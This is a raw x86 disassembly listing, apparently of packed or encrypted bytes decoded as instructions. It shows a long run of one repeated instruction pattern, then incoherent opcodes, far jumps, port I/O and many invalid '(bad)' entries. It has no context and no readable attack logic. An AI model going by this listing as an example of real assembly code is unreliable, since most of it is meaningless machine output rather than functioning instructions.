  416c01:	and    esi,DWORD PTR [edi-0x52]
  416c04:	cmpxchg DWORD PTR [edi],edi
  416c07:	sub    edi,DWORD PTR [edi]
  416c09:	mov    BYTE PTR [esp+edx*8],dh
  416c0c:	jecxz  0x416c88
  416c0e:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c14:	sub    edi,DWORD PTR [edi]
  416c16:	mov    BYTE PTR [esi-0x30],bl
  416c19:	ret    
  416c1a:	jp     0x416c3f
  416c1c:	push   edi
  416c1d:	mov    edi,DWORD PTR [ebp-0x2c]
  416c20:	add    DWORD PTR [esp+ebx*2-0x78],eax
  416c24:	pop    esi
  416c25:	shl    cl,1
  416c27:	jp     0x416c4c
  416c29:	mov    bh,0x85
  416c2b:	add    esi,DWORD PTR [ecx-0x77c0d693]
  416c31:	pop    esi
  416c32:	ins    BYTE PTR es:[edi],dx
  416c33:	out    0x7a,eax
  416c35:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c3b:	sub    edi,DWORD PTR [edi]
  416c3d:	mov    BYTE PTR [esi-0x30],bl
  416c40:	jecxz  0x416c7c
  416c42:	and    esi,DWORD PTR [edi+0x6db10f65]
  416c48:	sub    edi,DWORD PTR [edi]
  416c4a:	mov    BYTE PTR [esi-0x30],bl
  416c4d:	jecxz  0x416cc9
  416c4f:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c55:	sub    edi,DWORD PTR [edi]
  416c57:	mov    BYTE PTR [esi-0x30],bl
  416c5a:	jecxz  0x416cd6
  416c5c:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c62:	sub    edi,DWORD PTR [edi]
  416c64:	mov    BYTE PTR [esi-0x30],bl
  416c67:	jecxz  0x416ce3
  416c69:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c6f:	sub    edi,DWORD PTR [edi]
  416c71:	mov    BYTE PTR [esi-0x30],bl
  416c74:	jecxz  0x416cf0
  416c76:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c7c:	sub    edi,DWORD PTR [edi]
  416c7e:	mov    BYTE PTR [esi-0x30],bl
  416c81:	jecxz  0x416cfd
  416c83:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c89:	sub    edi,DWORD PTR [edi]
  416c8b:	mov    BYTE PTR [esi-0x30],bl
  416c8e:	jecxz  0x416d0a
  416c90:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416c96:	sub    edi,DWORD PTR [edi]
  416c98:	mov    BYTE PTR [esi-0x30],bl
  416c9b:	jecxz  0x416d17
  416c9d:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416ca3:	sub    edi,DWORD PTR [edi]
  416ca5:	mov    BYTE PTR [esi-0x30],bl
  416ca8:	jecxz  0x416d24
  416caa:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416cb0:	sub    edi,DWORD PTR [edi]
  416cb2:	mov    BYTE PTR [esi-0x30],bl
  416cb5:	jecxz  0x416d31
  416cb7:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416cbd:	sub    edi,DWORD PTR [edi]
  416cbf:	mov    BYTE PTR [esi-0x30],bl
  416cc2:	jecxz  0x416d3e
  416cc4:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416cca:	sub    edi,DWORD PTR [edi]
  416ccc:	mov    BYTE PTR [esi-0x30],bl
  416ccf:	jecxz  0x416d4b
  416cd1:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416cd7:	sub    edi,DWORD PTR [edi]
  416cd9:	mov    BYTE PTR [esi-0x30],bl
  416cdc:	jecxz  0x416d58
  416cde:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416ce4:	sub    edi,DWORD PTR [edi]
  416ce6:	mov    BYTE PTR [esi-0x30],bl
  416ce9:	jecxz  0x416d65
  416ceb:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416cf1:	sub    edi,DWORD PTR [edi]
  416cf3:	mov    BYTE PTR [esi-0x30],bl
  416cf6:	jecxz  0x416d72
  416cf8:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416cfe:	sub    edi,DWORD PTR [edi]
  416d00:	mov    BYTE PTR [esi-0x30],bl
  416d03:	jecxz  0x416d7f
  416d05:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d0b:	sub    edi,DWORD PTR [edi]
  416d0d:	mov    BYTE PTR [esi-0x30],bl
  416d10:	jecxz  0x416d8c
  416d12:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d18:	sub    edi,DWORD PTR [edi]
  416d1a:	mov    BYTE PTR [esi-0x30],bl
  416d1d:	jecxz  0x416d99
  416d1f:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d25:	sub    edi,DWORD PTR [edi]
  416d27:	mov    BYTE PTR [esi-0x30],bl
  416d2a:	jecxz  0x416da6
  416d2c:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d32:	sub    edi,DWORD PTR [edi]
  416d34:	mov    BYTE PTR [esi-0x30],bl
  416d37:	jecxz  0x416db3
  416d39:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d3f:	sub    edi,DWORD PTR [edi]
  416d41:	mov    BYTE PTR [esi-0x30],bl
  416d44:	jecxz  0x416dc0
  416d46:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d4c:	sub    edi,DWORD PTR [edi]
  416d4e:	mov    BYTE PTR [esi-0x30],bl
  416d51:	jecxz  0x416dcd
  416d53:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d59:	sub    edi,DWORD PTR [edi]
  416d5b:	mov    BYTE PTR [esi-0x30],bl
  416d5e:	jecxz  0x416dda
  416d60:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d66:	sub    edi,DWORD PTR [edi]
  416d68:	mov    BYTE PTR [esi-0x30],bl
  416d6b:	jecxz  0x416de7
  416d6d:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d73:	sub    edi,DWORD PTR [edi]
  416d75:	mov    BYTE PTR [esi-0x30],bl
  416d78:	jecxz  0x416df4
  416d7a:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d80:	sub    edi,DWORD PTR [edi]
  416d82:	mov    BYTE PTR [esi-0x30],bl
  416d85:	jecxz  0x416e01
  416d87:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d8d:	sub    edi,DWORD PTR [edi]
  416d8f:	mov    BYTE PTR [esi-0x30],bl
  416d92:	jecxz  0x416e0e
  416d94:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416d9a:	sub    edi,DWORD PTR [edi]
  416d9c:	mov    BYTE PTR [esi-0x30],bl
  416d9f:	jecxz  0x416e1b
  416da1:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416da7:	sub    edi,DWORD PTR [edi]
  416da9:	mov    BYTE PTR [esi-0x30],bl
  416dac:	jecxz  0x416e28
  416dae:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416db4:	sub    edi,DWORD PTR [edi]
  416db6:	mov    BYTE PTR [esi-0x30],bl
  416db9:	jecxz  0x416e35
  416dbb:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416dc1:	sub    edi,DWORD PTR [edi]
  416dc3:	mov    BYTE PTR [esi-0x30],bl
  416dc6:	jecxz  0x416e42
  416dc8:	and    esi,DWORD PTR [edi-0x394ef05b]
  416dce:	gs xor al,0x88
  416dd1:	jno    0x416da3
  416dd3:	jecxz  0x416e3f
  416dd5:	and    esi,DWORD PTR [edi+0x196bad8f]
  416ddb:	xchg   esi,eax
  416ddc:	jo     0x416d99
  416dde:	dec    esp
  416ddf:	sti    
  416de0:	fadd   DWORD PTR [edi-0x34]
  416de3:	add    dh,BYTE PTR [edi]
  416de5:	or     eax,edi
  416de7:	xor    al,0xda
  416de9:	jecxz  0x416e26
  416deb:	dec    ebp
  416dec:	xchg   edi,eax
  416ded:	fcom   DWORD PTR [ebx+0x7ee73cfb]
  416df3:	jae    0x416d8c
  416df5:	fs test al,0xd6
  416df8:	add    DWORD PTR [ebx+eiz*4],0x1e544e19
  416dff:	ficom  WORD PTR [esi+ebp*1+0x4908b722]
  416e06:	sub    eax,0xf41b43c3
  416e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e0c:	inc    ebx
  416e0d:	div    BYTE PTR [ebp+0x60c7e8b7]
  416e13:	arpl   WORD PTR ds:0xeba03a8e,dx
  416e19:	(bad)  
  416e1a:	jecxz  0x416e1e
  416e1c:	mov    bh,0xd8
  416e1e:	cwde   
  416e1f:	shl    DWORD PTR [eax],0x49
  416e22:	inc    eax
  416e23:	mov    ?,WORD PTR [edx]
  416e25:	out    dx,al
  416e26:	repz sbb eax,DWORD PTR [edx-0x7de0e133]
  416e2d:	xor    DWORD PTR [eax+0x5d],edi
  416e30:	jno    0x416db4
  416e32:	mov    eax,ds:0x4f4b444f
  416e37:	and    BYTE PTR [edi+0x23],0xe8
  416e3b:	mov    dh,0xcd
  416e3d:	xlat   BYTE PTR ds:[ebx]
  416e3e:	retf   
  416e3f:	hlt    
  416e40:	pop    ss
  416e41:	test   eax,0x29d4e78
  416e46:	jp     0x416e3b
  416e48:	jno    0x416de8
  416e4a:	mov    eax,0x5216ded5
  416e4f:	cli    
  416e50:	punpckhdq mm3,QWORD PTR [eax]
  416e53:	cmc    
  416e54:	and    bh,BYTE PTR [esi+0x8]
  416e57:	inc    ebp
  416e58:	xchg   ecx,eax
  416e59:	repz xchg ecx,eax
  416e5b:	xor    eax,0x71b66cf8
  416e60:	push   0xffffffef
  416e62:	ret    
  416e63:	loopne 0x416eba
  416e65:	fwait
  416e66:	mov    dh,0xfc
  416e68:	pop    ax
  416e6a:	add    eax,0x2b7cce25
  416e6f:	mov    ebx,0x5678eab0
  416e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e75:	jg     0x416df8
  416e77:	dec    BYTE PTR [ebx]
  416e79:	aam    0x2a
  416e7b:	adc    esi,edi
  416e7d:	inc    edi
  416e7e:	out    0x9c,eax
  416e80:	or     al,0x67
  416e82:	add    eax,0x4db7a685
  416e87:	mov    ebx,esi
  416e89:	(bad)
  416e8d:	cld    
  416e8e:	lods   al,BYTE PTR ds:[esi]
  416e8f:	push   esi
  416e90:	inc    dh
  416e92:	(bad)  
  416e93:	xlat   BYTE PTR ds:[ebx]
  416e94:	dec    ebp
  416e95:	pop    ebx
  416e96:	enter  0x8ba7,0x6e
  416e9a:	rol    dh,cl
  416e9c:	loope  0x416e75
  416e9e:	mov    edx,0x703d403e
  416ea3:	addr16 ja 0x416eee
  416ea6:	inc    ebp
  416ea7:	mov    al,ds:0xb199de2d
  416eac:	aam    0xbf
  416eae:	cmp    eax,0xab93a209
  416eb3:	pop    edi
  416eb4:	imul   esp,DWORD PTR [ebx-0x585a1252],0x3f56766e
  416ebe:	inc    edi
  416ebf:	gs (bad) 
  416ec1:	imul   esi,DWORD PTR [ebp-0xa78f9ea],0x6e
  416ec8:	jae    0x416ed9
  416eca:	shr    DWORD PTR [esi-0x1ef68cfa],cl
  416ed0:	sub    edx,DWORD PTR [ebx+0x4d270ac4]
  416ed6:	ror    DWORD PTR [ecx],1
  416ed8:	js     0x416ebd
  416eda:	adc    bl,BYTE PTR [ebx]
  416edc:	int    0x54
  416ede:	int    0x2b
  416ee0:	cmc    
  416ee1:	mov    ds:0xdddc392,al
  416ee6:	push   0x6d
  416ee8:	push   cs
  416ee9:	inc    edx
  416eea:	xchg   BYTE PTR [eax],al
  416eec:	xchg   esp,eax
  416eed:	sbb    DWORD PTR [ebx-0x80],0x221a3645
  416ef4:	dec    esi
  416ef5:	sub    al,0xce
  416ef7:	jno    0x416ed6
  416ef9:	inc    edx
  416efa:	call   0x2ba7:0xa40a3ac4
  416f01:	loope  0x416f56
  416f03:	ins    DWORD PTR es:[edi],dx
  416f04:	mov    bh,0x1e
  416f06:	imul   DWORD PTR [edi+0x1222bdcc]
  416f0c:	xchg   esi,eax
  416f0d:	ja     0x416ed0
  416f0f:	push   0x5cbd00b3
  416f14:	das    
  416f15:	sahf   
  416f16:	rol    DWORD PTR [ebx],cl
  416f18:	pop    ebx
  416f19:	call   0x8673:0x4bee2a17
  416f20:	test   DWORD PTR [eax-0x3],ecx
  416f23:	mov    esp,0xfdbcbb33
  416f28:	out    dx,eax
  416f29:	mov    al,BYTE PTR [edx-0x6da1acc1]
  416f2f:	push   eax
  416f30:	(bad)  
  416f31:	dec    edx
  416f32:	mov    bh,0x3e
  416f34:	lds    ebx,FWORD PTR [ebx-0x2f]
  416f37:	cmp    BYTE PTR [edi],0x4a
  416f3a:	inc    ebx
  416f3b:	jbe    0x416f50
  416f3d:	mov    ds,WORD PTR [ebx-0x54]
  416f40:	adc    BYTE PTR [ebp-0x14cf6731],0xbd
  416f47:	mov    ebx,DWORD PTR [eax+0x60]
  416f4a:	mov    al,0x82
  416f4c:	sahf   
  416f4d:	jl     0x416f1c
  416f4f:	out    0xd1,al
  416f51:	in     eax,dx
  416f52:	popa   
  416f53:	div    dh
  416f55:	sub    edx,DWORD PTR ds:0x354d22b3
  416f5b:	faddp  st(1),st
  416f5d:	push   0xf25de1fc
  416f62:	fild   DWORD PTR [ebx+0x71]
  416f65:	cmp    al,0x7a
  416f67:	test   ebp,eax
  416f69:	int3   
  416f6a:	jno    0x416f23
  416f6c:	mov    dl,0x2f
  416f6e:	loope  0x416fb1
  416f70:	pop    ecx
  416f71:	pop    ss
  416f72:	adc    esp,DWORD PTR [edi-0x43]
  416f75:	mov    cl,0x7a
  416f77:	and    cl,BYTE PTR [ebx-0x6ab0ce58]
  416f7d:	in     al,dx
  416f7e:	scas   eax,DWORD PTR es:[edi]
  416f7f:	js     0x416fd2
  416f81:	mov    ecx,0xe55b345d
  416f86:	xor    esi,DWORD PTR [eax]
  416f88:	aad    0x99
  416f8a:	mov    bh,dl
  416f8c:	mov    BYTE PTR [esi+0x4f62235a],dl
  416f92:	pop    eax
  416f93:	(bad)  
  416f94:	jbe    0x416fcb
  416f96:	dec    ecx
  416f97:	cmp    al,0x1
  416f99:	stos   BYTE PTR es:[edi],al
  416f9a:	mov    esi,0x199efdd6
  416f9f:	fdiv   DWORD PTR [eax-0x372e02ac]
  416fa5:	inc    ebp
  416fa6:	mov    edi,0x9bddaef7
  416fab:	repz icebp 
  416fad:	xchg   BYTE PTR [ebx+0x23],ah
  416fb0:	mov    eax,ds:0x63f42612
  416fb5:	js     0x416ff4
  416fb7:	jns    0x41702c
  416fb9:	mov    esp,DWORD PTR [eax+edi*4+0x4cbf9570]
  416fc0:	pop    ds
  416fc1:	in     al,0x0
  416fc3:	leave  
  416fc4:	mov    bh,0x60
  416fc6:	and    ebp,esp
  416fc8:	into   
  416fc9:	xor    eax,0xacc9db18
  416fce:	xor    eax,DWORD PTR [eax+0x5c]
  416fd1:	jb     0x41702a
  416fd3:	in     al,dx
  416fd4:	add    bh,al
  416fd6:	out    dx,al
  416fd7:	push   ds
  416fd8:	fld    TBYTE PTR [esi-0x3d6897f6]
  416fde:	xlat   BYTE PTR ds:[ebx]
  416fdf:	pop    edx
  416fe0:	fldcw  WORD PTR [esi+0x68]
  416fe3:	xchg   edi,eax
  416fe4:	ins    BYTE PTR es:[edi],dx
  416fe5:	xor    BYTE PTR [ebx],ah
  416fe7:	pop    ebx
  416fe8:	add    DWORD PTR [eax+0x17],0x49a1fbe
  416fef:	mov    esi,0x89513aa1
  416ff4:	mov    ebp,0xb8c921f8
  416ff9:	inc    ecx
  416ffa:	dec    esp
  416ffb:	push   cs
  416ffc:	dec    eax
  416ffd:	neg    edi
  416fff:	sbb    DWORD PTR [ebp-0xfc45ce8],ebx
  417005:	ja     0x416fdd
  417007:	push   ebx
  417008:	add    bh,BYTE PTR [esi-0x7e]
  41700b:	test   DWORD PTR [edx],esp
  41700d:	mov    ds:0xfdecc22b,al
  417012:	mov    bh,0xd2
  417014:	mov    WORD PTR [ebp-0x5c853d9c],ss
  41701a:	clc    
  41701b:	arpl   WORD PTR [ebx-0x3f],di
  41701e:	mov    esi,0xdec23290
  417023:	aad    0xd8
  417025:	dec    esp
  417026:	ins    DWORD PTR es:[edi],dx
  417027:	mov    bh,0x96
  417029:	xchg   ebx,eax
  41702a:	sub    ch,dl
  41702c:	sar    DWORD PTR [ebx+edi*2-0x7d],cl
  417030:	scas   al,BYTE PTR es:[edi]
  417031:	push   es
  417032:	pop    edi
  417033:	(bad)  
  417034:	jae    0x417079
  417036:	push   ds
  417037:	xchg   BYTE PTR [edx+0x72bbb00b],bl
  41703d:	repz repnz dec ecx
  417040:	cmp    al,0x14
  417042:	mov    edx,0xff6f08d3
  417047:	adc    al,0xba
  417049:	xor    al,0xe
  41704b:	jmp    0x1fec:0xbbcf4a13
  417052:	adc    dl,0xe1
  417055:	push   ebx
  417056:	popf   
  417057:	sub    eax,0xd9b35c5c
  41705c:	lock cmp eax,0xbd19e1c2
  417062:	scas   eax,DWORD PTR es:[edi]
  417063:	fnstsw WORD PTR [ecx+0x714a44c5]
  417069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41706a:	aaa    
  41706b:	mov    WORD PTR [ebx],gs
  41706d:	in     eax,dx
  41706e:	push   eax
  41706f:	add    al,0x82
  417071:	popf   
  417072:	lds    ebp,FWORD PTR [edx+eax*2]
  417075:	repz fnclex 
  417078:	sbb    cl,BYTE PTR [ecx+0x5628af8f]
  41707e:	imul   edi,DWORD PTR [edx],0x86042bb4
  417084:	pop    esp
  417085:	cmp    al,0xb3
  417087:	xchg   ecx,eax
  417088:	adc    dh,al
  41708a:	sub    DWORD PTR [ebp+0x21552c3],edx
  417090:	mul    BYTE PTR [eax+0x77ddf105]
  417096:	sbb    BYTE PTR [edi+ebp*4],bl
  417099:	push   edx
  41709a:	iret   
  41709b:	pop    eax
  41709c:	cmc    
  41709d:	(bad)  
  41709e:	jmp    0x241a47ae
  4170a3:	aas    
  4170a4:	stos   BYTE PTR es:[edi],al
  4170a5:	sbb    ah,BYTE PTR [ebx-0x2a]
  4170a8:	in     eax,0x66
  4170aa:	and    BYTE PTR [ebx],bl
  4170ac:	mov    edx,cs
  4170ae:	jecxz  0x4170f9
  4170b0:	addr16 dec esi
  4170b2:	or     eax,0xbfa096ca
  4170b7:	outs   dx,DWORD PTR ds:[esi]
  4170b8:	sub    eax,esi
  4170ba:	repnz retf 0x6852
  4170be:	out    dx,eax
  4170bf:	or     dl,BYTE PTR [ebp+ebp*4+0x79]
  4170c3:	push   ecx
  4170c4:	push   ebp
  4170c5:	scas   al,BYTE PTR es:[edi]
  4170c6:	(bad)  
  4170c7:	mov    al,0x0
  4170c9:	mov    dh,al
  4170cb:	dec    eax
  4170cc:	aam    0x9e
  4170ce:	call   0xeca95073
  4170d3:	pop    ebp
  4170d4:	(bad)  
  4170d6:	sub    al,0xec
  4170d8:	sahf   
  4170d9:	sub    al,0x2a
  4170db:	inc    edi
  4170dc:	popa   
  4170dd:	adc    edx,DWORD PTR [edi]
  4170df:	loope  0x4170cf
  4170e1:	or     dh,ch
  4170e3:	js     0x417108
  4170e5:	cmp    al,BYTE PTR [esi+0x43]
  4170e8:	lock sbb BYTE PTR [edi+0x7d],ah
  4170ec:	or     eax,0x93de482e
  4170f1:	jmp    FWORD PTR [eax-0x18b29ecb]
  4170f7:	sti    
  4170f8:	fistp  WORD PTR [eax+0x575edaa4]
  4170fe:	add    DWORD PTR [edx+0x30210e9],edi
  417104:	sub    eax,DWORD PTR [eax]
  417106:	mov    ebx,DWORD PTR [esp+esi*2-0x39]
  41710a:	jb     0x41716b
  41710c:	mov    DWORD PTR [ecx-0x64],eax
  41710f:	mov    es,esi
  417111:	xchg   ebp,eax
  417112:	push   cs
  417113:	jns    0x4170df
  417115:	ins    DWORD PTR es:[edi],dx
  417116:	dec    ebp
  417117:	ret    
  417118:	call   0x9f17:0x304e68ae
  41711f:	dec    ebx
  417120:	sbb    DWORD PTR [ebp+0x4a3dbde4],ebx
  417126:	add    dh,bl
  417128:	rcl    BYTE PTR [ebx+0x65],0xda
  41712c:	es mov ah,0x45
  41712f:	push   edi
  417130:	int3   
  417131:	sub    al,0xd8
  417133:	psubusb mm4,mm1
  417136:	jmp    0x27ec:0x77303da8
  41713d:	aad    0xd0
  41713f:	(bad)  
  417142:	mov    DWORD PTR [esi+ecx*2+0x4d554e66],esp
  417149:	aas    
  41714a:	clc    
  41714b:	push   edx
  41714c:	inc    ecx
  41714d:	hlt    
  41714e:	cmp    DWORD PTR [esi+0x7c],esi
  417151:	fiadd  DWORD PTR [edi+0x8de1603]
  417157:	lods   eax,DWORD PTR ds:[esi]
  417158:	adc    eax,0xc3e7859a
  41715d:	sbb    eax,0x34def873
  417162:	lods   al,BYTE PTR ds:[esi]
  417163:	imul   esp,DWORD PTR [edi+0x1976e310],0x7f
  41716a:	xchg   ebp,eax
  41716b:	sbb    eax,0xd3000ca3
  417170:	cmp    al,0x9f
  417172:	(bad)  
  417173:	push   ds
  417174:	dec    edi
  417175:	jg     0x41712f
  417177:	inc    edi
  417178:	test   BYTE PTR [ebx],bl
  41717a:	dec    edi
  41717b:	inc    ebp
  41717c:	cwde   
  41717d:	xchg   esp,esp
  41717f:	mov    eax,0x7a3f5fcc
  417184:	ins    DWORD PTR es:[edi],dx
  417185:	cld    
  417186:	adc    DWORD PTR [ebx-0x3c],0xe
  41718a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718b:	mov    WORD PTR [esi-0x3d589475],?
  417191:	int3   
  417192:	std    
  417193:	jmp    0x4171c2
  417195:	push   ds
  417196:	xchg   edi,eax
  417197:	sahf   
  417198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417199:	aaa    
  41719a:	jl     0x417215
  41719c:	into   
  41719d:	push   DWORD PTR [ecx-0x3ec43704]
  4171a3:	fs dec ebx
  4171a5:	or     eax,0x3e78fbfe
  4171aa:	in     eax,0x90
  4171ac:	out    0x1f,eax
  4171ae:	jle    0x41720c
  4171b0:	(bad)  [eax]
  4171b2:	dec    eax
  4171b3:	or     bl,ah
  4171b5:	xchg   ebp,eax
  4171b6:	in     eax,0x90
  4171b8:	mov    esp,0x2b747764
  4171bd:	daa    
  4171be:	or     DWORD PTR [esp+ecx*2+0x4e],edx
  4171c2:	dec    eax
  4171c3:	mov    eax,0x594645d2
  4171c8:	test   DWORD PTR [edi],0x4176d337
  4171ce:	pop    edi
  4171cf:	pushf  
  4171d0:	addr16 ret 
  4171d2:	xor    eax,0xa6758162
  4171d7:	cmp    ebp,DWORD PTR [edx+0x11f2b7b8]
  4171dd:	mov    edx,0x6e41243f
  4171e2:	retf   0x41a
  4171e5:	cli    
  4171e6:	jmp    0x4171fa
  4171e8:	ret    0x63c5
  4171eb:	cmc    
  4171ec:	(bad)  
  4171ee:	sbb    DWORD PTR [ebx],edx
  4171f0:	retf   
  4171f1:	aaa    
  4171f2:	jmp    0x7cf0:0x9fc2ce29
  4171f9:	lods   eax,DWORD PTR ds:[esi]
  4171fa:	retf   
  4171fb:	push   ecx
  4171fc:	ins    DWORD PTR es:[edi],dx
  4171fd:	mov    bh,0xf9
  4171ff:	iret   
  417200:	adc    ch,dh
  417202:	mov    BYTE PTR [ebx],dl
  417204:	cwde   
  417205:	cmp    BYTE PTR [edx+0x12],al
  417208:	test   eax,0xd55dde90
  41720d:	xchg   ebp,eax
  41720e:	repnz sbb BYTE PTR [edi],ah
  417211:	adc    BYTE PTR [eax],cl
  417213:	sbb    al,0xb4
  417215:	adc    DWORD PTR [edx-0x60],0xf271ee0d
  41721c:	stos   BYTE PTR es:[edi],al
  41721d:	popf   
  41721e:	xor    cl,BYTE PTR ds:0x885666dd
  417224:	pop    edx
  417225:	into   
  417226:	ret    0x9d38
  417229:	out    dx,al
  41722a:	inc    ebp
  41722b:	add    edi,DWORD PTR [esi]
  41722d:	push   es
  41722e:	inc    ebp
  41722f:	out    0x56,eax
  417231:	and    BYTE PTR [edi+0x6c7e76c1],bl
  417237:	and    eax,0xb77c73ef
  41723c:	adc    eax,0x388d61d3
  417241:	jmp    0xf8eb:0x79430fbd
  417248:	mov    bl,0x23
  41724a:	fs jmp 0x1967:0xf55fe840
  417252:	test   eax,ecx
  417254:	mov    al,ds:0xac0ade48
  417259:	add    BYTE PTR [ebx-0x14ead36b],ah
  41725f:	mov    ss,eax
  417261:	stc    
  417262:	cmp    BYTE PTR [edx-0x4c],cl
  417265:	stc    
  417266:	inc    edx
  417267:	test   al,0x1f
  417269:	xor    ecx,DWORD PTR [edx]
  41726b:	sbb    al,0xf9
  41726d:	je     0x417253
  41726f:	lock (bad) 
  417271:	repnz cmp al,0xa4
  417274:	mov    bl,0x7d
  417276:	add    ebp,DWORD PTR ds:[eax-0x21]
  41727a:	leave  
  41727b:	(bad)  
  41727d:	das    
  41727e:	xor    ah,BYTE PTR [eax+ebp*8]
  417281:	push   esi
  417282:	inc    ebp
  417283:	cs jecxz 0x4172ad
  417286:	xchg   edx,eax
  417287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417288:	cmp    al,0x6c
  41728a:	pushf  
  41728b:	pop    edx
  41728c:	outs   dx,DWORD PTR ds:[esi]
  41728d:	lods   al,BYTE PTR ds:[esi]
  41728e:	or     ebp,DWORD PTR ds:0xb3ee6b49
  417294:	popa   
  417295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417296:	lahf   
  417297:	out    0xb0,eax
  417299:	jg     0x4172c7
  41729b:	dec    ecx
  41729c:	inc    esi
  41729d:	adc    ah,BYTE PTR [ebp+0x5f675bf]
  4172a3:	fisttp DWORD PTR [ebp-0x32c482e8]
  4172a9:	jle    0x417265
  4172ab:	xchg   ebp,eax
  4172ac:	add    edx,DWORD PTR [esi-0x3a319d55]
  4172b2:	add    esi,edx
  4172b4:	(bad)  
  4172b6:	jno    0x4172ff
  4172b8:	inc    ebp
  4172b9:	cmp    dh,BYTE PTR ds:0x667c34b
  4172bf:	int    0xb8
  4172c1:	mov    eax,ds:0x12bd2a09
  4172c6:	adc    dx,WORD PTR [esi-0xe]
  4172ca:	mov    bh,bh
  4172cc:	push   ebp
  4172cd:	fwait
  4172ce:	cwde   
  4172cf:	adc    edx,0xffffffa1
  4172d2:	dec    ebp
  4172d3:	pop    ebx
  4172d4:	loop   0x4172ee
  4172d6:	mov    edx,0xde319df9
  4172db:	fstp   TBYTE PTR [edi-0x43]
  4172de:	pop    ss
  4172df:	push   edx
  4172e0:	scas   eax,DWORD PTR es:[edi]
  4172e1:	repz sub al,0xb5
  4172e4:	cwde   
  4172e5:	hlt    
  4172e6:	retf   0x7f28
  4172e9:	sub    BYTE PTR [edx-0xc531f3a],bh
  4172ef:	lahf   
  4172f0:	loopne 0x4172aa
  4172f2:	or     al,0x74
  4172f4:	add    bl,cl
  4172f6:	xor    esi,DWORD PTR [edx+0x76f89762]
  4172fc:	popa   
  4172fd:	mov    bh,0xfd
  4172ff:	stos   DWORD PTR es:[edi],eax
  417300:	shr    BYTE PTR [edx+0x1439f828],1
  417306:	std    
  417307:	jns    0x41732f
  417309:	popa   
  41730a:	pop    ecx
  41730b:	out    0xaf,al
  41730d:	xor    DWORD PTR [edi+edi*2-0x69],ecx
  417311:	mov    ah,0x9
  417313:	retf   
  417314:	mov    DWORD PTR [eax+ebp*1],edi
  417317:	add    dl,BYTE PTR [esi+edx*4]
  41731a:	(bad)  
  41731b:	scas   al,BYTE PTR es:[edi]
  41731c:	and    ch,0x56
  41731f:	fstp   DWORD PTR [ebx+0x16ab12e1]
  417325:	repnz and al,0x1d
  417328:	jae    0x41734d
  41732a:	lea    eax,ds:0x73303fd5
  417330:	fnstcw WORD PTR [edi-0x69]
  417333:	push   esi
  417334:	stos   BYTE PTR es:[edi],al
  417335:	leave  
  417336:	lds    eax,FWORD PTR [ebp-0x40]
  417339:	cmp    edx,DWORD PTR [edx-0x697768a1]
  41733f:	or     esi,DWORD PTR [edx+0x400a9df0]
  417345:	adc    ch,ah
  417347:	ins    BYTE PTR es:[edi],dx
  417348:	push   esp
  417349:	loop   0x4173bb
  41734b:	sub    al,0xd0
  41734d:	ds push 0xaa33c7f7
  417353:	mov    ds:0x5da3a442,eax
  417358:	mov    bl,0x24
  41735a:	bound  edx,QWORD PTR [ecx]
  41735c:	out    0xf,al
  41735e:	jb     0x4173d4
  417360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417361:	inc    eax
  417362:	ret    
  417363:	ret    0xc17e
  417366:	inc    ebp
  417367:	in     al,dx
  417368:	scas   eax,DWORD PTR es:[edi]
  417369:	ss add al,0x3a
  41736c:	jns    0x417365
  41736e:	aas    
  41736f:	xchg   ebp,eax
  417370:	test   eax,0xa421b391
  417375:	int    0x3a
  417377:	in     al,dx
  417378:	in     eax,0xdc
  41737a:	mov    cs,WORD PTR [ebx-0x1c]
  41737d:	cmp    DWORD PTR [edx+0x6],esi
  417380:	jecxz  0x417336
  417382:	jne    0x41735d
  417384:	sahf   
  417385:	xor    eax,0xebf2ebdc
  41738a:	lods   eax,DWORD PTR ds:[esi]
  41738b:	push   0xffffffee
  41738d:	mov    edi,0x948e975b
  417392:	mov    dl,0x15
  417394:	mov    al,ds:0x3005f7ef
  417399:	in     eax,0xdd
  41739b:	jmp    0xaec46872
  4173a0:	xor    BYTE PTR [ecx],0x8e
  4173a3:	sar    DWORD PTR [edi],cl
  4173a5:	call   0x24fabafe
  4173aa:	and    eax,DWORD PTR [ebp+0x67436376]
  4173b0:	inc    esp
  4173b1:	sbb    al,0xb
  4173b3:	popf   
  4173b4:	mov    ds:0x1a539a9b,al
  4173b9:	sbb    esi,esi
  4173bb:	out    0xd9,eax
  4173bd:	xor    BYTE PTR [ebp-0x43],dh
  4173c0:	jno    0x4173bf
  4173c2:	leave  
